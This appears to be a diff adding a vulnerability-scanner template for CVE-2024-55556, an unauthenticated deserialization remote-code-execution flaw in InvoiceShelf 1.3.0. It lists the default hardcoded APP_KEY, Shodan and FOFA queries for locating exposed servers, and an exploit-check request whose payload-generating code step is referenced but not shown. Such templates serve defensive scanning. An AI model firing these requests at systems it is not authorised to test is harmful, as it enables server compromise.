@@ -1,0 +1,55 @@
+id: CVE-2024-55556
+
+info:
+  name: "InvoiceShelf = 1.3.0 反序列化漏洞"
+  author: iamnoooob,rootxharsh,pdresearch
+  severity: critical
+  description: |
+    InvoiceShelf version 1.3.0 and below contains an unauthenticated PHP deserialization vulnerability that can lead to remote code execution. An attacker with knowledge of the APP_KEY can achieve remote command execution on the server through Laravel's cookie deserialization. While the vulnerability is severe, it is partially mitigated in default installations as the APP_KEY is regenerated during setup.
+  remediation: |
+    Upgrade InvoiceShelf to a version higher than 1.3.0. Ensure your APP_KEY is properly regenerated and not using the default value
+  reference:
+    - https://www.synacktiv.com/en/advisories/crater-invoice-unauthenticated-remote-command-execution-when-appkey-known
+    - https://github.com/rapid7/metasploit-framework/pull/19950
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-55556
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2024-55556
+    cwe-id: CWE-502
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: 'http.title:"InvoiceShelf"'
+    fofa-query: 'title="InvoiceShelf"'
+  tags: InvoiceShelf
+
+variables:
+  marker: "{{randstr}}"
+  marker_b64: "{{base64(marker)}}"
+  APP_KEY: 'base64:kgk/4DW1vEVy7aEvet5FPp5un6PIGe/so8H0mvoUtW0=' # default hardcoded key
+
+flow: |
+    code();
+    http();
+
+
+http:
+  - raw:
+      - |
+        GET /login HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{code_response}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{marker}}"
+          - 'Illuminate/Database/DatabaseManager.php' # only matches in Debug mode
+
+      - type: status
+        status:
+          - 500
+# digest: 490a0046304402204698451453cf480c6f4c8e276ddf0d9380a61c999a65ec0d29c5ed8490864e9e02205439af80b227f33a6378587084d8d95d7a50df8523a6d8f338a2561adf63ebc1:922c64590222798bb761d5b6d8e72950
